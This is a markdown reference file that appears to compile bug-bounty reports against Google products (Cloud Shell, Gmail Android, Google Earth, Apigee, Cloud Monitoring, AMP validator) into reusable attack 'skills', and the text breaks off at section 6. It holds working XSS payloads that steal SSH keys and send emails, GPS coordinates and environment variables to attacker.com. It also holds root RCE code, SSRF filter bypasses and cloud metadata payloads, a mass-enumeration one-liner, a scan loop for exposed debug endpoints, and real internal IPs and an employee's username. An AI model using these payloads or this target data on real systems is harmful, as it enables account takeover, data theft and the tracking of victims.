---
name: Google Bug Hunters Skills
description: Skills and techniques derived from omespino's real bughunters.google.com reports. Chains, vectors, and methodologies that have produced confirmed findings against Google products.
type: reference
---

## Findings profile (Google Bug Hunters / VRP)

- **Programs:** Google VRP (Google Cloud Shell)

---

## Confirmed skills

### 1. Google Cloud Shell instance takeover — Root via XSS + Path Traversal + Container Escape + SSH key exfiltration
**Target:** Google Cloud Shell | **PoC:** https://github.com/omespino/gcs_instace_takeover

**Full attack chain:**

#### Step 1 — Sandboxed XSS in .md file preview
- Payload: `<style onload=alert(document.domain)>` in any `.md` file
- The preview sandbox is actually the embedded Theia editor with full access to all files in the instance

#### Step 2 — LFI / Path Traversal via file:// URI in files endpoint
- Vulnerable endpoint: `https://XXX-dot-XXXXXXXX-dot-devshell.appspot.com/files/?uri=file:///path`
- Allows reading any system file
- **Container escape:** using `../` in the path escapes the container root and accesses the host filesystem

#### Step 3 — Exfiltration of critical files
- Read `/etc/hosts` → get the VM hostname
- Read `../id_cloudshell` (outside the container) → get the SSH private key of the instance
- Send both files to the attacker server (ngrok + nc)

#### Step 4 — Building the SSH target
- Hostname in `/etc/hosts`: `cs-6000-devshell-vm-XXXX-XXXX-XXXX-XXXX`
- Remove the `cs-6000-` prefix and add `.cloudshell.dev`
- Result: `devshell-vm-XXXX-XXXX-XXXX-XXXX.cloudshell.dev`
- Replace `\n` with line breaks in the private key and save as `id_cloudshell`

#### Step 5 — Root SSH
```bash
ssh -i id_cloudshell -p 6000 root@devshell-vm-XXXX-XXXX-XXXX-XXXX.cloudshell.dev
# w00t — root on the Google Cloud Shell VM
```

#### Delivery vector (attack on victims)
- The **"Open in Google Cloud Shell"** button on GitHub automatically runs the repository in the Cloud Shell of whoever clicks it
- Upload the malicious repo to GitHub → victim clicks → attack runs in the victim's Cloud Shell → take control of their instance as root

**Chained techniques:**
1. XSS in Markdown preview (sandboxed Theia editor)
2. LFI via `uri=file:///` parameter without sanitization
3. Container escape via path traversal `../`
4. Exfiltration of SSH private key
5. Root SSH access to the underlying host

**Full XSS technical chain (PoC detail):**

**Trigger:** `<style onload="...">` in `.md` file previewed in Firefox with CSP disabled

**Step 1 — XSS in Markdown preview:**
```html
<style onload="{
  var container_url = 'https://' + location.host + '/files/?uri=/etc/ssh/keys/authorized_keys';
  fetch(container_url)
    .then(response => response.json()
      .then(data =>
        fetch('https://' + location.host + '/files/download/?id=' + data.id)
          .then(response => response.text()
            .then(content => document.write('authorized_keys:<br>' + content)))
      )
    )
}">
```

**Step 2 — API chain to read files:**
```
GET /files/?uri=/etc/ssh/keys/authorized_keys  →  { "id": "xxxxx" }
GET /files/download/?id=xxxxx                  →  file content
```

**Target file:** `/etc/ssh/keys/authorized_keys` → reading authorized keys = potential RCE by adding the attacker's key

**Documented limitation:** requires Firefox with CSP disabled — in Chrome the CSP blocks it

**Note:** `191*7 = 1337` in the PoC — author's l33t reference

**Ideal targets for similar techniques:**
- Any platform with Markdown or HTML file preview in a sandbox
- Web editors (Theia, VS Code Web, Jupyter) with file-read endpoints
- Cloud shell / cloud IDE environments with filesystem access
- `?uri=`, `?path=`, `?file=` endpoints that accept `file://` or absolute paths
- Always look for `/etc/ssh/keys/authorized_keys` and `~/.ssh/authorized_keys` as LFI target → RCE impact

---

### 20. XSS in Google Cloud Shell via SVG onload (Safari) + SSH private key exfiltration
**Target:** https://ssh.cloud.google.com/cloudshell/editor | **Browser:** Safari (macOS Catalina)

**New vector — SVG with onload in Safari:**
```xml
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg onload="alert(document.domain)" xmlns="http://www.w3.org/2000/svg"></svg>
```

**Safari-specific behavior:**
- Safari blocks third-party cookies → Cloud Shell opens the editor in a new window (`Open in a New Window`)
- When closing that second tab, the editor appears in the first → the XSS executes in that context
- If the user allows third-party cookies, the flow is direct without an extra window

**Full payload — exfiltration of SSH private key (`id_cloudshell`):**
```xml
<svg onload="{
  var container_url = 'https://' + location.host + '/files/?uri=../id_cloudshell';
  fetch(container_url)
    .then(response => response.json()
      .then(data =>
        fetch('https://' + location.host + '/files/download/?id=' + data.id)
          .then(response => response.text()
            .then(key => alert(document.domain + '\n\n' + key)))
      )
    )
}" version="1.1" xmlns="http://www.w3.org/2000/svg"></svg>
```

**SSH private key path:** `../id_cloudshell` — relative path that escapes the container (same vector as report #1)

**Consolidated XSS vectors in Google Cloud Shell:**
| Vector | Trigger | Browser | File |
|---|---|---|---|
| `<style onload>` | .md preview | Firefox (CSP off) | xss.md |
| Filename `<img onerror>` in launch.json | Debug Console | Any | `<img onerror=alert(0)>.js` |
| SVG `onload` | .svg preview | Safari | alert.svg |
| `xlink:href` data URI | Click on element | Any | SVG with link |

**SSH key path consistent across all Cloud Shell reports:**
```
/files/?uri=../id_cloudshell           → gets the file ID
/files/download/?id=<id>              → downloads the key content
```

---

### 19. Gmail email address exfiltration via HTML attachment — Android content:// URI leak
**Target:** Gmail Android app + Chrome Android | **Versions:** Gmail 2020.09.06, Chrome 85.0.4183.127

**Why it works:**
- Gmail Android opens HTML attachments in Chrome via an Android content:// provider URI
- That URI contains the user's email in the path: `content://com.google.android.gm.sapi/<email>/message_attachment_external/...`
- JavaScript inside the HTML can read `document.location` → extracts the email from the path

**Malicious HTML attachment payload:**
```html
<script>
  // Extract email from the content:// URI → the email is at index [3] of the path
  let email = document.location.toString().split('/')[3];
  document.write('<h2>Email: ' + email + '</h2>');
  alert(email);
  // Exfiltrate to attacker server
  fetch("http://attacker.com/?victim_email=" + email);
</script>
```

**Exposed content URI (format):**
```
content://com.google.android.gm.sapi/<EMAIL>/message_attachment_external/<thread-id>/<msg-id>/0.1
                                       ↑
                                  email here at position [3]
```

**Attack chain:**
1. Attacker sends an email with `gmail_exfil.html` as attachment
2. Victim opens the attachment → Chrome Android loads it with the content:// URI
3. JS extracts the email from the path → `alert()` + `fetch()` to the attacker server
4. Attacker receives the email in the query string: `?victim_email=victim@gmail.com`

**Generalized technique — Android content:// URI information disclosure:**
- Android content providers (Gmail, Drive, Photos) use URIs that may contain sensitive data in the path
- Apps that pass these URIs to webviews or external browsers may leak that info to JS
- Look in other Android apps that open HTML/web content with `content://` URIs:
  - `document.location` → extract data from the path
  - `document.referrer` → may contain the original URI
- **Ideal targets:** email apps, messaging apps, document managers that open HTML attachments in webview or external browser

---

### 18. RCE as root in Apigee via Node.js Hosted Target — feature abuse
**Target:** apigee.com (Google Apigee API Management) | **Type:** Feature abuse → RCE

**Technique:** Apigee allows deploying "Hosted Targets" with custom Node.js code. The sandbox was insufficient — the code ran as root with access to the host system.

**Node.js payload (proxy index.js):**
```javascript
var http = require('http');
const { exec } = require('child_process');

var svr = http.createServer(function(req, resp) {
  resp.setHeader('Content-Type', 'application/json');
  exec('id; cat /etc/shadow', (error, stdout, stderr) => {
    resp.end('RCE output:\n\n' + stdout);
  });
});
svr.listen(process.env.PORT || 3000, function() {});
```

**Steps to exploit:**
1. `Develop > API Proxies > +Proxy → Hosted Target → Quick Start`
2. Deploy to "prod"
3. `Edit proxy → Develop tab → Resources/hosted/index.js`
4. Replace with payload → Save → visit the proxy URL

**Impact confirmation:** `/etc/shadow` readable = process running as root

**Pattern — feature abuse on code execution platforms:**
- Look for "hosted targets", "serverless functions", "custom scripts", "webhooks with code" features in SaaS/PaaS platforms
- If they allow running code and the sandbox is inadequate → escalation to RCE on the host
- Node.js `child_process.exec()` / Python `os.system()` / Ruby backticks to execute system commands
- Confirm root/impact by reading: `id`, `/etc/shadow`, `/etc/passwd`, `/proc/self/environ`

**Ideal targets with similar patterns:**
- API management platforms with custom code (Apigee, Kong, AWS API Gateway with Lambda)
- Low-code/no-code with "code nodes" (n8n, Zapier Code, Make/Integromat)
- CI/CD with custom runners (GitHub Actions self-hosted, GitLab Runner, Jenkins)
- Testing platforms with custom scripts (Postman, Insomnia scripts)

---

### 17. XSS in Google Cloud Shell via filename injection in Debug Console (launch.json)
**Target:** https://ssh.cloud.google.com/cloudshell/editor | **Trigger:** debugger launch.json

**New vector — filename as XSS payload:**
```bash
# Create file with malicious name
touch "<img src=0 onerror=alert(0)>.js"
```

**Injection in debugger launch.json:**
```json
{
  "configurations": [{
    "type": "node",
    "request": "launch",
    "name": "XSS Debug console",
    "program": "${workspaceFolder}/<img src=0 onerror=alert(0)>.js"
  }]
}
```

**Why it works:**
- The Cloud Shell Debug Console (Theia) renders the `program` field of `launch.json` as HTML without sanitization
- The filename contains the payload → it gets injected into `launch.json` → the debugger renders it → XSS executed

**Comparison of XSS vectors in Google Cloud Shell (same target, different vectors):**
| Vector | Trigger | File |
|---|---|---|
| `<style onload>` in .md | Markdown preview | xss.md |
| Filename `<img onerror>` in launch.json | Debug Console | any file |

**Generalization — filename injection as XSS:**
- Web IDEs (Theia, VS Code Web, Cloud9, Jupyter) that render filenames as HTML
- File explorers in web apps that list files without sanitization
- Any interface that displays the filename in the UI: uploads, file managers, log viewers
- **Test filename payload:** `<img src=x onerror=alert(1)>.ext`
- **Other filename vectors:** `"><script>alert(1)</script>.txt`, `';alert(1)//`.js`

**Impact in Cloud Shell:** XSS with full access to the Linux instance filesystem (same impact as previous Cloud Shell reports)

---

### 16. Blind SSRF oracle via Google Cloud Monitoring Uptime Check — 0.0.0.0 bypass
**Target:** https://console.cloud.google.com/monitoring/uptime | **Type:** SSRF + blind data exfiltration

**Localhost bypass — `0.0.0.0` evades the blocklist:**
- The filter blocks: `127.*`, `169.*`, `10.*`, `172.*`, and common local IPs
- `0.0.0.0` is not in the blocklist → the server resolves it as localhost → successful SSRF
- Confirm: 0ms response = localhost hit (instant local network)

**Uptime check configuration for SSRF:**
```
Protocol: TCP
Hostname: 0.0.0.0
Port: 22
Response Content: "SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.10"
Response timeout: 1s
```
- If content matches → `"checkPassed": true`
- If it doesn't match → `"contentMismatch": true`

**Character-by-character oracle exfiltration:**
The boolean response (checkPassed/contentMismatch) acts as a 1-bit oracle:
```
"SSH"     → checkPassed: true   ✓
"SSH-"    → checkPassed: true   ✓
"SSH-2"   → checkPassed: true   ✓
"SSH-2.0" → checkPassed: true   ✓
"SSH-2.1" → contentMismatch: true  ✗
```
Automatable: brute-forcing character by character over the charset `[0-9A-Za-z._-]` reconstructs the full banner

**Automatable exfiltration algorithm:**
```python
import requests

charset = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz.-_ "
known = "SSH"

while True:
    for c in charset:
        # do uptime check with content = known + c
        # if checkPassed: true → known += c; break
        # if contentMismatch: true → continue
        pass
```

**`0.0.0.0` bypass for SSRF — documented variants:**
| Bypass | Blocks |
|---|---|
| `0.0.0.0` | Generally not filtered → resolves to localhost |
| `0177.0.0.1` | Octal of 127.0.0.1 |
| `2130706433` | Decimal of 127.0.0.1 |
| `::1` | IPv6 localhost |
| `[::]` | IPv6 any address |
| `http://①②⑦.①.①.①` | Unicode bypass |

**Ideal targets for this pattern:**
- Any "uptime check" / "health check" / "webhook test" service that makes server-side requests
- URL validators, feed importers, thumbnail generators
- The oracle does not need to be boolean — any observable difference in the response works (time, size, HTTP code)

---

**Extension of the previous report — SSRF via redirect chain + `[::169.254.169.254]` → GCP metadata**

**Bypass with redirect on own server:**
```php
<?php
// 302.php — hosted on attacker server
$location = 'http://[::169.254.169.254]'; // IPv6 format compatible with IPv4 — bypasses the filter
$path = '/computeMetadata/v1/project/project-id';
header('Location: ' . $location . $path, TRUE, 302);
?>
```

**Uptime check configuration with redirect chain:**
```
Protocol: HTTP
Hostname: omespino.com (own server with 302.php)
Path: /302.php
Custom Headers: Metadata-Flavor: Google   ← required for GCP metadata /v1/ endpoints
```

**Why `[::169.254.169.254]` works:**
- The filter blocks `169.254.169.254` literally but not its IPv6-compatible form
- `[::169.254.169.254]` is an IPv4-mapped IPv6 address — represents the same IP at the network level
- The uptime checker follows the redirect and reaches the GCP metadata endpoint

**Difference between the two bypasses in the previous report:**
| Bypass | Target | Protocol |
|---|---|---|
| `0.0.0.0` | localhost (SSH port 22) | TCP |
| redirect + `[::169.254.169.254]` | GCP metadata endpoint | HTTP |

**Exfiltratable data from GCP metadata via oracle:**
- `project/project-id` → GCP project name
- `project/numericProjectId` → numeric ID
- Any `/computeMetadata/v1/` endpoint accessible with `Metadata-Flavor: Google`

**Header forwarding in uptime checks:**
- Google Cloud Monitoring allows adding custom headers → they are forwarded to the destination server
- Use to pass `Metadata-Flavor: Google`, `Authorization`, or other headers required by the internal target

---

### 15. No rate limit + IDOR sequential — mass enumeration of Android TV device IDs
**Target:** `https://www.android.com/tv/setup/lookup?dc={}` | **Type:** Missing rate limit + IDOR

**Technique:** the `dc` parameter is a predictable sequential numeric code — without rate limit, allows mass enumeration of real device names and IDs

**Exploitation one-liner:**
```bash
time seq -w 0 009999 | xargs -I {} -P20 curl -s \
  "https://www.android.com/tv/setup/lookup?dc={}" \
  | tr '&' '\n' | grep device | tee android_tvs_scrapped.txt
```
- `-P20` → 20 parallel requests
- `seq -w 0 009999` → zero-padded numbers from 0000 to 9999
- `tr '&' '\n' | grep device` → parses the `device_id`, `device_name`, `device_type` fields from the response
- **Result:** ~900 devices in ~3 minutes (9% hit rate)

**Attack scalability:**
| Requests | Estimated devices | Approx time |
|---|---|---|
| 10,000 | ~900 | 3 min |
| 100,000 | ~9,000 | 30 min |
| 1,000,000 | ~90,000 | ~5 hrs |

**Generalized methodology — enumeration without rate limit:**
1. Identify endpoints with numeric/sequential parameters (`id=`, `dc=`, `code=`, `token=`)
2. Verify absence of rate limit with a request burst
3. Automate with `seq + xargs -P` (parallel) or `ffuf -w wordlist`
4. Parse responses to extract value fields

**Indicators of enumerable endpoints:**
- Single-field numeric parameters in setup/lookup URLs
- Responses that vary between "found" and "not found" without blocking
- Codes with zero padding (`0001`, `0002`...) → finite and predictable range

**Ideal targets:** IoT device activation/setup endpoints, invitation codes, short session IDs, device pairing codes

---

### 14. Arbitrary file read via null byte (%00) in Google Earth Pro macOS — from the UI
**Target:** Google Earth Pro Desktop 7.3.3.7786 (macOS) | **Type:** File Inclusion via null byte bypass

**Technique completely different from the KML reports — vector from the app's UI:**
- Does not require an external KML file — the vector is the "Add Link" field when creating a Pin in Google Earth's own UI
- **Payload:** `<a href="file:///etc/passwd%00.html">passwd</a>`

**Why the null byte works:**
- The `%00` (null byte) terminates the string at the OS level — the operating system reads `/etc/passwd` and stops there
- The `.html` extension after the null byte never reaches the filesystem — it's only there to trick the app's filter
- The app verifies the extension (`.html`) and accepts it, but the OS opens the real file (`/etc/passwd`)
- **This technique worked on macOS** because the path parsing was vulnerable to null byte injection

**Exploitation steps (from the UI):**
1. Open Google Earth Pro → create a new Pin
2. In the "Add Link" field paste: `<a href="file:///etc/passwd%00.html">text</a>`
3. Click on the hyperlink in the left "Places" panel
4. The contents of `/etc/passwd` are displayed directly

**Generalization — null byte bypass in file:// URIs:**
```
file:///etc/passwd%00.html
file:///etc/shadow%00.jpg
file:///home/user/.ssh/id_rsa%00.png
file:///Users/user/Library/Keychains/login.keychain%00.html  # macOS
```

**Applications in other contexts:**
- Any desktop app that filters extensions in file:// URIs but is vulnerable to null byte
- File inclusion parameters in legacy apps (PHP, old Java): `?file=config.php%00.txt`
- Browsers and document viewers with file:// rendering without null byte sanitization

**Difference between Google Earth vectors (consolidated):**
| Report | Platform | Vector | Technique |
|---|---|---|---|
| KML CDATA + script src | Desktop Linux | External KML file | Relative path-traversal LFI |
| KML CDATA + onerror | iOS | KML via Drive | XSS + geolocation |
| Pin "Add Link" + %00 | Desktop macOS | App native UI | Null byte bypass in file:// |

---

### 13. XSS in Google Earth iOS app via KML — exfiltration of precise geolocation
**Target:** Google Earth iOS App v9.134.0 | **Delivery:** Google Drive link → "Open with Google Earth"

**Key differences vs Google Earth Pro desktop (report #11):**
- Platform: **iOS** (not desktop Linux)
- XSS trigger: `onerror` in `<img>` with broken src instead of `<script src="file://...">`
- Impact: exfiltration of **precise GPS coordinates** (latitude/longitude) via `navigator.geolocation`
- Delivery: KML shared via Google Drive → victim opens in Google Earth iOS

**KML payload (CDATA with onerror):**
```xml
<description><![CDATA[
  <img onerror='{
    navigator.geolocation.getCurrentPosition(function(position) {
      document.write("Lat: " + position.coords.latitude + " Lon: " + position.coords.longitude);
      document.write("<img src=http://attacker.com/?" + position.coords.latitude + "," + position.coords.longitude + ">");
    });
  }' src="./2.htm">
]]></description>
```

**Why `onerror` works here:**
- `src="./2.htm"` is a relative path that does not exist → the embedded browser fires `onerror`
- The `onerror` handler executes arbitrary JS in the KML context
- In maps apps, the user already expects a location prompt → accepts without suspicion

**Full attack chain:**
1. Attacker creates malicious KML and uploads it to Google Drive
2. Shares the link with the victim
3. Victim clicks on Drive → "Open with Google Earth"
4. KML loads, victim clicks on the marker
5. App requests location permission (expected behavior in a maps app — victim accepts)
6. XSS triggers, gets precise GPS, exfiltrates to the attacker server

**XSS trigger differences in KML (consolidated):**
| Technique | Event | Requires interaction |
|---|---|---|
| `<script src="file:///etc/environment">` | automatic on load | No |
| `<img onerror='...' src="./broken">` | automatic (broken src) | No |
| hyperlink `javascript:prompt()` in .doc/.ppt | user click | Yes |
| `<svg onload='...'>` | automatic on render | No |

**Ideal targets for geolocation exfiltration:**
- Mobile apps that render HTML/KML/SVG with embedded browser (maps, navigation, tourism)
- Apps that already have active location permissions → don't request additional confirmation
- `navigator.geolocation` works in any webview with location permission granted

---

### 12. Mobile Harness Lab Server LFI as root — $3,133.70 reward (100.x.x.x range, port 9999)
**Target:** 100.8.125.10:9999 | **Reward:** $3,133.70 | **Accepted:** Aug 12, 2021 | **System:** Mobile Harness Lab

**New elements vs previous reports:**

**IP in 100.x.x.x range (CGNAT/private) exposed publicly:**
- 100.64.0.0/10 IPs are normally private (CGNAT RFC 6598)
- Finding services in this range reachable from the internet is unusual and high value
- Indicates Google had a misconfigured network route to these IPs

**Root confirmation via /proc/self/environ:**
- `SUDO_GID=0` and `SUDO_USER=root` in the output of `/procz?file=/proc/self/environ`
- These environ fields are direct confirmation of a process running with root privileges via sudo
- **Key indicator:** look for `SUDO_GID`, `SUDO_USER`, `USER=root`, `UID=0` in the environ output

**New /varz confirmation with prod data:**
```
/varz → built-at search-build-search-infra@otci17.prod.google.com:/google/src/cloud/buildrabbit-username/buildrabbit-client/google3
```
- Exposes internal build system username (`buildrabbit-username`) and prod hostname

**g3doc:// link in /statusz:**
- `g3doc://java/com/google/wireless/qa/mobileharness/lab:lab_server_deploy.jar`
- `g3doc://` links in /statusz point to internal Google documentation — confirm the service is legitimately internal
- Redirect to login at **MOMA** (Google's internal SSO) when accessed from outside corp network

**"Not hosted on Borg" in /statusz:**
- Indicates the service runs outside Google's main orchestration system
- These services tend to have less security oversight → more likely to have exposed debug endpoints

**Reward reference for severity calibration:**
- $3,133.70 for LFI + internal dashboard exposure without direct RCE
- The `/labelaclz` + `/procz?file=` + `/flagz` pattern on Google ASN public IPs is in the $1,000–$5,000+ range depending on the exposed system

---

### 11. XSS + LFI in Google Earth Pro via KML — /etc/environment disclosure with relative path traversal
**Target:** Google Earth Pro Desktop 7.3.4.8284 (Linux) | **System:** Ubuntu 20.04

**Why it's different from the Chrome report:**
- Vector: **KML** file (Google Earth proprietary format) instead of HTML
- Google Earth Pro's embedded browser allows `file://` with **relative path traversal** from the KML location
- The KML `<description><![CDATA[...]]>` section renders full HTML/JS — XSS in a desktop app

**Malicious KML payload:**
```xml
<Placemark>
  <name>placemark</name>
  <description><![CDATA[
    <script src="file:../../../../../../../etc/environment"></script>
    <script>
      document.write('PATH var = ' + PATH);
      document.write('JAVA_HOME var = ' + JAVA_HOME);
      document.write('<img src="http://attacker.com/?path=' + PATH + '&java_home=' + JAVA_HOME + '">');
    </script>
  ]]></description>
</Placemark>
```

**Key technical difference — relative path traversal:**
- Chrome used absolute path: `file:///etc/environment`
- Google Earth uses relative path: `file:../../../../../../../etc/environment`
- Traversal starts from the KML file location → allows reading files outside the KML directory

**Attack flow:**
1. Victim downloads/receives the malicious `.kml`
2. Double click → Google Earth Pro opens it automatically
3. Victim clicks on the marker (placemark) → the description is rendered
4. The XSS triggers, loads `/etc/environment`, exfiltrates variables to the attacker server

**Generalization — XSS in desktop apps via file formats:**
- KML → Google Earth Pro
- Look for other formats that render HTML in desktop apps: `.gpx`, `.svg`, map files, rich documents
- Desktop apps with embedded browsers (Electron, WebKit, CEF) often have `file://` access without modern browser restrictions
- **Indicator:** if a desktop app shows HTML content (descriptions, tooltips, panels) → try injection via the file format it consumes

---

### 10. Local file read via Chrome — /etc/environment as valid JavaScript
**Target:** Google Chrome 92.0.4515.159 (Linux) | **Status:** Duplicate | **OS:** Ubuntu 20.04

**Technique:** `/etc/environment` has a JavaScript-compatible format (`VAR="value"`) — Chrome can load it as a script from file:// and the variables become accessible in the global scope

**Malicious HTML payload:**
```html
<!-- Load /etc/environment as JS script -->
<script src="file:///etc/environment"></script>

<!-- Exfiltrate known variables to attacker server -->
<img src="http://attacker.com/?path=" + PATH>
<img src="http://attacker.com/?java=" + JAVA_HOME>
```

**Why it works:**
- `/etc/environment` contains lines like `PATH="/usr/local/bin:/usr/bin"` — syntax identical to a JS variable declaration
- Chrome in `file://` mode allows loading other local files as scripts
- File variables stay in the global scope and can be read and exfiltrated

**Variants of local files loadable as a script:**
- `/etc/environment` — system environment variables
- Any file with `KEY="value"` or `KEY=value` format — valid JS syntax
- Brute force common variable names (`PATH`, `JAVA_HOME`, `HOME`, `USER`, etc.)

**Requirement:** the victim must open the malicious HTML locally in Chrome (delivery vector: phishing, USB drop, email attachment)

**Exfiltration via netcat:**
```bash
sudo nc -l -p 80  # listen on attacker server
# Chrome will send the variables in the IMG tag query string
```

**Broader applications of the technique:**
- Look for other Linux config files with JS-compatible format: `.bashrc`, `/etc/profile`, app config files
- Applicable to other browsers that allow `file://` cross-file loading

---

### 9. SSRF in AMP Validator → GCP metadata exposure (169.254.169.254)
**Target:** https://validator.ampproject.org/ | **Closed:** Oct 27, 2021 | **Collaboration:** with Sreeram KL

**Vector:** The AMP validator fetches the URL you pass it to validate it — any URL including internal IPs
**Payload:**
```
http://169.254.169.254/?recursive=true&alt=text
```

**Data exposed from the GCP metadata endpoint:**
- `instance/id` — instance ID
- `instance/region` — GCP region
- `instance/zone` — GCP zone
- `project/numericProjectId` — GCP project numeric ID
- `project/projectId` — GCP project name
- `instance/serviceAccounts/email` — service account email
- `instance/serviceAccounts/scopes` — service account OAuth permissions

**Key parameters of the GCP metadata endpoint:**
- `?recursive=true` → returns ALL metadata as a tree
- `&alt=text` → plain text format instead of JSON
- Alternative header for some endpoints: `Metadata-Flavor: Google`

**Load balancer indicator:** responses with different `instance/id` on each request → multiple GCP instances behind the service

**Target class for SSRF → GCP metadata:**
- URL validators (AMP, OpenGraph, Schema.org)
- Link previewers (Slack, Discord, internal tools)
- Webhook services that GET/POST configurable URLs
- Import/embed of external URLs (RSS feeds, iframes, images by URL)
- Any service running on GCP/AWS/Azure that fetches user URLs

**Full payloads per cloud provider:**
```
# GCP
http://169.254.169.254/?recursive=true&alt=text
http://metadata.google.internal/computeMetadata/v1/?recursive=true  (+ header Metadata-Flavor: Google)

# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01  (+ header Metadata: true)
```

---

### 8. Googler personal dev machine exposed — UPI India payment gateway + LFI as root (HTTPS/443)
**Target:** 34.120.121.40:443 (HTTPS) | **Fixed:** Aug 19, 2022 | **System:** UPI India Payment Gateway sync service

**Unique elements vs previous reports:**

**Googler personal development machine exposed publicly:**
- `/statusz` reveals: `Built on rathivivek@linuxcloudtop1.c.googlers.com:/google/src/cloud/rathivivek/...`
- Identifies the owning Googler (`rathivivek`) and their personal cloud workstation
- Internal build path: `//cloud/api_products/payment_gateway/upi_india/issuer_switch/sync_service`
- **Critical system:** India's UPI payment system infrastructure

**Via /streamz — root confirmation and Kubernetes context:**
```
binary_name: service
hostname:    sync-service-7d4965ddb9-rh7tq   ← Kubernetes pod
unix_user:   root
```
- Hostname with `<name>-<replicaset>-<pod-id>` format is a Kubernetes indicator — the service runs in an exposed k8s pod

**New endpoint: `/reportcardz`**
- `https://34.120.121.40/reportcardz` — exposes internal service reports without authentication

**LFI via HTTPS (port 443):**
```
https://34.120.121.40/procz?file=/proc/self/environ
https://34.120.121.40/procz?file=/proc/self/maps
https://34.120.121.40/procz?file=/proc/cpuinfo
```

**Additional technique — identifying the owner via /statusz:**
- `Built on <user>@<machine>` in `/statusz` exposes the Googler's username and the name of their workstation
- Useful to correlate with public GitHub repositories of the employee
- `Built as <path>` exposes the internal project path in Google3 (Google's internal monorepo)

**Kubernetes indicators in debug endpoints:**
- `hostname` with `<service>-<hash>-<pod>` format → k8s pod
- Negative `global_pid` → possible indicator of a container PID namespace
- Look for these patterns in `/streamz` to identify if the target runs on k8s

---

### 7. Internal Google Mobile Harness dashboard exposed + LFI — /streamz endpoint (2026)
**Target:** 108.177.0.8:9999 | **Accepted:** May 6, 2026 | **System:** Google Mobile Harness (device testing infra)

**New endpoint discovered: `/streamz`**
- `/streamz` is Google's internal metrics system (different from `/flagz`)
- Exposes internal metrics tree without authentication: `/build/`, `/grpc/`, `/net/`, `/proc/`, `/rpc/`, `/security/`, etc.
- Sensitive data visible at `/streamz#`:
  ```
  binary_name: com.google.devtools.mobileharness.infra.lab.LabServerLauncher
  global_pid:  2547180562544291379
  hostname:    192.168.95.1   ← internal IP
  unix_user:   g00gl3          ← internal Google service account
  ```
- Internal systems exposed in the tree: Chubby (lock service), Monarch (metrics), Fireaxe, privacy/ddt

**LFI via /procz (same pattern confirmed in new system):**
```
http://108.177.0.8:9999/procz?file=/proc/cpuinfo
http://108.177.0.8:9999/procz?file=/proc/self/environ
http://108.177.0.8:9999/procz?file=/proc/self/maps
```

**Full inventory of Google debug endpoints (consolidated from all reports):**
| Endpoint | Information exposed |
|---|---|
| `/labelaclz` | Owner, policy (OPEN/OWNER_ONLY), confirms if running as root |
| `/flagz` | Config flags, internal API keys, corp service URLs |
| `/procz?file=` | **LFI** — reads arbitrary system files |
| `/statusz` | Server state, memory, build label, BNS address, changelist |
| `/streamz` | Internal metrics tree, binary name, internal hostname, unix_user |
| `/varz` | Internal process variables |
| `/java/statusz` | Java variant of statusz (springboard.google.com) |
| `/java/procz` | Java variant of LFI |
| `/java/labelaclz` | Java variant of labelaclz |
| `/reportcardz` | Internal service reports (discovered at 34.120.121.40) |

**Ports observed in real findings:**
- `80` — 34.94.39.119, 35.227.157.158
- `443` (HTTPS) — 34.120.121.40 (UPI payment gateway), 216.239.34.157 (chrome-proxy)
- `2222`, `7777` — 34.83.45.88 (DremelGateway)
- `8080` — 34.75.135.42 (GOA server / Go Application framework)
- `9999` — 108.177.0.8, 100.8.125.10 (Mobile Harness)
- `443/springboard` — springboard.google.com (GWS prod)

**Google IP ranges with real findings:**
- `34.x.x.x` — Google Cloud (GCP)
- `35.x.x.x` — Google Cloud (GCP)
- `100.8.x.x` — internal CGNAT exposed
- `108.177.x.x` — Google prod
- `216.239.x.x` — Google prod (Chrome proxy infra)

**Users observed in real findings (via /labelaclz or /proc/self/environ):**
| User | System | IP |
|---|---|---|
| `root` | DremelGateway, Mobile Harness, sync-service, GOA, GCS | multiple |
| `gws-prod` | Google Web Server (Google Search) | springboard.google.com |
| `g00gl3` | Mobile Harness (device testing) | 108.177.0.8 |
| `chrome-proxy` | Chrome ConnectProxy | 216.239.34.157 |

**Note:** LFI is valid even when the process does not run as root — `chrome-proxy`, `gws-prod` are service accounts with access to sensitive prod data.

**`/labelaclz` format with ACL groups (MDB):**
```
ACLs:
  admin: user/chrome-proxy  mdb/chrome-proxy
  read:
  modify:
  debugging: mdb/chrome-proxy-eng  user/chrome-proxy  mdb/drawbridge-blessed-debugging
```
- `mdb/` = Google's internal group system (Member Database)
- Exposed `mdb/` groups reveal internal Google team names

**Google prod hostname convention (via /proc/self/environ):**
- Format: `<2-3 letters><number>.prod.google.com` (e.g. `ill7`, `ilfh24`, `ilgm5`, `ilst9`)
- Multiple hostnames = service behind a load balancer → multiple instances exposed

**Framework indicators by binary_name / hostname in /streamz:**
| Value | Framework / System |
|---|---|
| `com.google.devtools.mobileharness.*` | Mobile Harness (device testing) |
| `service` / `sync-service-*` | Generic Kubernetes service |
| `server` + hostname `goa-*` | GOA (Google Go Application framework) |
| `LabServer` | Mobile Harness Lab Server |
| hostname `*-deployment-*-*` | Kubernetes Deployment |

**Optimized workflow to find these services:**
```bash
# 1. Get IPs from Google's ASN
whois -h whois.radb.net -- '-i origin AS15169' | grep route | awk '{print $2}'

# 2. Scan known internal debug ports (updated with all real ports)
nmap -p 80,443,2222,7777,8080,8888,9090,9999 --open <range> -oG scan.txt

# 3. Test all debug endpoints on each active IP
for ip_port in $(cat scan.txt | grep "open" | awk '{print $2":"$NF}'); do
  for ep in labelaclz flagz statusz streamz procz varz reportcardz; do
    curl -s --max-time 3 "http://$ip_port/$ep" | grep -q "Owner Name\|root\|google\|unix_user" && echo "HIT: $ip_port/$ep"
  done
done
```

---

### 6. Google Fiber — FTP anonymous + Telnet default creds on servers and network printers
**Target:** Google Fiber (ASN googlefiber.net) | **IPs:** 136.61-63.x.x, 23.228.141.x

**Two vectors in the same finding:**

**Vector 1 — FTP anonymous login:**
```bash
ftp 136.32.102.4
# user: anonymous
# password: anonymous (or empty)
```
- Active on servers and on Brother/HP printers exposed in the Google Fiber range

**Vector 2 — Telnet with default credentials on network printers:**
```bash
telnet 23.228.141.115 23
# password: access
# user: admin
```
